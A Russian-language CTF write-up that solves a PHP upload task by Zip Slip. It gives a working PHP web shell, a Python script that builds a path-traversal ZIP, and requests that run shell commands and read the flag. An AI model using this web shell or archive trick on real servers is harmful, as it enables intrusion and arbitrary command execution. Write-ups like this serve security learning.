# Доказательство запугиванием: Write-up

Чтение HTML-кода страницы наискосок показывает, что временное ограничение устроено через JavaScript на стороне клиента, и время начала никуда не посылается, так что, если мы не справимся за 5 часов, о времени нам беспокоиться не стоит.

Условия задач выглядят адекватно, а задание не по стеганографии, так что покекаем, отложим их и сосредоточимся на единственном, что осталось — форме отправки решений.

Если залить какой-нибудь случайный не-ZIP-файл, обнаружится, что, во-первых, идет переадресация на `/index.php`, то есть сайт написан на PHP, а во-вторых, выдается ошибка «Код ошибки 19 при распаковке ZIP». Поиск «php zip error code 19» в гугле подсказывает, что это в самом деле код ошибки, который выдет `ZipArchive::open`.

Если залить нормальный архив, то выведется список с ссылками на загруженные файлы. Первая реакция — залить архив с PHP-шеллом. Все бы хорошо, но скрипт заливается, а как PHP не выполняется. Видимо, скрипты исполняются только в корне сайта.

Как залить эксплоит в корень? Заметим, что если залить частично некорректный архив (например, побитый или запароленный), выведется ошибка вроде:

```
Warning: copy(zip:///tmp/phpnRTN9i#file): failed to open stream: operation failed in /var/www/html/_/index.php on line 121
```

При использовании `ZipArchive::extractTo` ошибка бы выглядела не так, и уж точно не включала бы путь `zip:///tmp/phpnRTN9i#file`, поэтому распаковка архива, вероятно, реализована руками, а значит, есть надежда на известные уязвимости. Поиск в гугле фразы «zip archive vulnerability» выдает в числе первых описание [ZIP slip](https://github.com/snyk/zip-slip-vulnerability).

Идея уязвимости заключается в том, что путь до файла в архиве может быть в общем-то произвольной строкой, в том числе содержащей `..`, и если распаковка написана неаккуратно, можно заставить программу распаковать скрипт не в нужную папку, а по произвольному пути. Например, если создать архив, в котором эксплоит назван `../../exploit.php`, то при его распаковке, вероятно, эксплоит создастся в корне сайта.

Создать такой архив можно, например, используя Python:

`exploit.php`:

```php
<pre><?php passthru($_GET["command"]); ?></pre>
```

`create_zip.py`:

```python
import zipfile
with zipfile.ZipFile("exploit.zip", "w") as archive:
    archive.write("exploit.php", "../../exploit.php")
```

И в самом деле, файл успешно заливается, и появляется возможность выполнить произвольные команды. Например:

```
GET https://<host>/<token>/exploit.php?command=ls+-la+/
```

```
total 60
drwxr-xr-x   1 root   root     160 Dec 18 12:42 .
drwxr-xr-x   1 root   root     160 Dec 18 12:42 ..
drwxr-xr-x   2 root   root    4096 Dec 18 12:40 app
drwxr-xr-x   2 root   root    4096 Oct 25 13:35 bin
drwxr-xr-x   2 root   root    4096 Sep  3 12:10 boot
drwxr-xr-x   1 root   root     320 Dec 18 12:42 dev
drwxr-xr-x   1 root   root      60 Dec 18 12:42 etc
-rw-r--r--   1 nobody nogroup   48 Dec 18 12:42 flag
drwxr-xr-x   2 root   root    4096 Sep  3 12:10 home
drwxr-xr-x   8 root   root    4096 Oct 25 13:31 lib
drwxr-xr-x   2 root   root    4096 Oct 24 00:00 lib64
drwxr-xr-x   2 root   root    4096 Oct 24 00:00 media
drwxr-xr-x   2 root   root    4096 Oct 24 00:00 mnt
drwxr-xr-x   2 root   root    4096 Oct 24 00:00 opt
dr-xr-xr-x 338 nobody nogroup    0 Dec 18 12:42 proc
drwx------   2 root   root    4096 Nov  3 17:26 root
drwxr-xr-x   1 root   root      60 Oct 25 13:35 run
drwxr-xr-x   1 root   root    4096 Oct 25 13:35 sbin
drwxr-xr-x   2 root   root    4096 Oct 24 00:00 srv
drwxr-xr-x   2 root   root    4096 Sep  3 12:10 sys
drwxrwxrwt   1 root   root      40 Dec 18 12:42 tmp
drwxr-xr-x   1 root   root    4096 Oct 24 00:00 usr
drwxr-xr-x   1 root   root      80 Oct 25 13:31 var
```

```
GET https://<host>/<token>/exploit.php?command=cat+/flag
```

```
ugra_this_aint_funny_this_is_cursed_nbynv7yv0cn4
```

Флаг: **ugra_this_aint_funny_this_is_cursed_nbynv7yv0cn4**
